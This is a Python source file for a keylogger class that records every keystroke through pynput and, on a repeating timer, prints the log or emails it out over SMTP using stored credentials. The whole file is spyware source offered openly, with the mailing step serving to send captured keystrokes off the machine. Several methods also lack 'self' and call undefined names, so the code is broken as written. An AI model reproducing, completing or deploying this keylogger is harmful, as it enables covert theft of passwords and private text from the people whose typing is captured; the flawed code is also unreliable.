import threading
import pynput.keyboard
import subprocess, smtplib

class Keylogger:

    def __init__(self, interval):
        self.log = "Keylogger Started"
        self.interval = interval

        self.smtp_server = ''
        self.smtp_port = 0
        self.email = ''
        self.password = ''
        self.enable_mail_service = False
    
    def append_to_log(key_input):
        self.log += str(key_input)

    def process_key(key):
        try:
            current_key = key.char
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = ' ' + str(key) + ' '
        append_to_log(current_key)

    def report(self):
        if self.enable_mail_service : 
            self.send_mail(log)
        else:
            print(self.log)
        
        self.log = 'Keylogger Started'
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def configure_mail(self, email, password, smtp_server, smtp_port):
        self.email = email
        self.password = password
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port

        self.enable_mail_service = True

    def send_mail(self, mesage):
        server = smtplib.SMTP(self.smtp_server, self.smtp_port)
        server.starttls()
        server.login(self.email, self.password)
        server.sendmail(self.email,self.email, "\n\n" + str(mesage))
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=process_key)
        with keyboard_listener:
            self.report()
            keyboard_listener.join() 